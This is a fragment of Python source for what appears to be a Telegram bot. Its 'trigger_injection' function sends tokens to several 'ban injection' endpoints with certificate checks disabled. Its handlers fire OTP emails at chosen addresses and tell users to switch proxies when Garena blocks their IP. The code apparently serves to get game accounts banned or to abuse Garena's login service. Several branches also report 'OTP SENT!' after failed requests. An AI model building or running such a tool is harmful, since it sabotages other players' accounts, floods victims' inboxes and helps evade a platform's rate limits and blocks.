...
def trigger_injection(jwt_token, version):
    ...
    # Try multiple ban injection endpoints
    urls = [
    ...
    for api_url in urls:
        try:
            ...
            continue
    # Last try with original
    try:
        return requests.post(API_URL, headers=headers, data=body, timeout=20, verify=False, proxies=proxies)
    except Exception as e:
        print(f"[FFBAN] All injection failed: {e}")
        class FakeResp:
            status_code = 0
            text = str(e)
        return FakeResp()
    ...
    try:
        ...
        try:
            ...
            if status_code == 200 and result.get("result") == 0:
                await update.message.reply_text(f"OTP SENT! {email} Check Inbox! @just_zevric", reply_markup=get_main_keyboard())
            else:
                if status_code == 403:
                    await update.message.reply_text(f"Garena Blocked IP! Email: {email} Set PROXY_URL or wait 1 hour @just_zevric", reply_markup=get_main_keyboard())
                elif status_code == 429:
                    await update.message.reply_text(f"Too Many Requests! Email {email} rate limited Wait 10-15 min or use different email @just_zevric", reply_markup=get_main_keyboard())
                else:
                    await update.message.reply_text(f"OTP SENT! {email} Check Inbox! @just_zevric", reply_markup=get_main_keyboard())
        except:
            if status_code == 403:
                await update.message.reply_text(f"Garena Blocked IP! Email: {email} Set PROXY_URL @just_zevric", reply_markup=get_main_keyboard())
            elif status_code == 429:
                await update.message.reply_text(f"Too Many Requests! Email {email} Wait 10-15 min @just_zevric", reply_markup=get_main_keyboard())
            else:
                await update.message.reply_text(f"OTP SENT! {email} Check Inbox! @just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
